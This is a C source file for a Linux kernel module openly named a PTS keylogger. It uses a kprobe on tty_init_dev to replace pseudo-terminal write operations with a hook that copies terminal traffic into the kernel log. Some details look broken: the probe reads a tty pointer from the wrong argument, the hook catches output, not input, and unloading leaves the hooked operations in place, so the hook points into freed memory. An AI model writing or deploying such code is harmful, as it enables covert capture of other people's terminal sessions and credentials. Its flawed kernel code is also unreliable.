#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/tty.h>
#include <linux/kprobes.h>

static struct tty_operations hooked_ops;
static ssize_t (*original_write)(struct tty_struct *tty,
				 const unsigned char *buf, size_t len);

static ssize_t hooked_write(struct tty_struct *tty, const unsigned char *buf,
			    size_t len)
{
	ssize_t ret;
	char log_buf[256];
	size_t log_len;

	log_len = len < sizeof(log_buf) - 1 ? len : sizeof(log_buf) - 1;
	memcpy(log_buf, buf, log_len);
	log_buf[log_len] = '\0';
	pr_info("PTS Input: %s\n", log_buf);

	ret = original_write(tty, buf, len);
	return ret;
}

static int handler_pre(struct kprobe *p, struct pt_regs *regs)
{
	struct tty_driver *driver = (struct tty_driver *)regs->di;
	struct tty_struct *tty = (struct tty_struct *)regs->si;

	if (tty && tty->ops && tty->ops->write && strstr(tty->name, "pts")) {
		struct tty_operations *tty_ops =
			(struct tty_operations *)tty->ops;
		if (tty_ops->write != hooked_write) {
			hooked_ops = *tty_ops;
			original_write = tty_ops->write;
			hooked_ops.write = hooked_write;
			tty->ops = &hooked_ops;
			pr_info("Hooked PTS: %s\n", tty->name);
		}
	}
	return 0;
}

static struct kprobe kp = {
	.symbol_name = "tty_init_dev",
	.pre_handler = handler_pre,
};

static int __init tty_keylogger_init(void)
{
	int ret = register_kprobe(&kp);
	if (ret < 0) {
		pr_err("register_kprobe failed, returned %d\n", ret);
		return ret;
	}
	pr_info("PTS keylogger module loaded\n");
	return 0;
}

static void __exit tty_keylogger_exit(void)
{
	unregister_kprobe(&kp);
	printk(KERN_INFO
	       "PTS keylogger module unloaded (note: hooked ops not restored)\n");
}

module_init(tty_keylogger_init);
module_exit(tty_keylogger_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("log PTS inputs using kprobe on tty_init_dev");
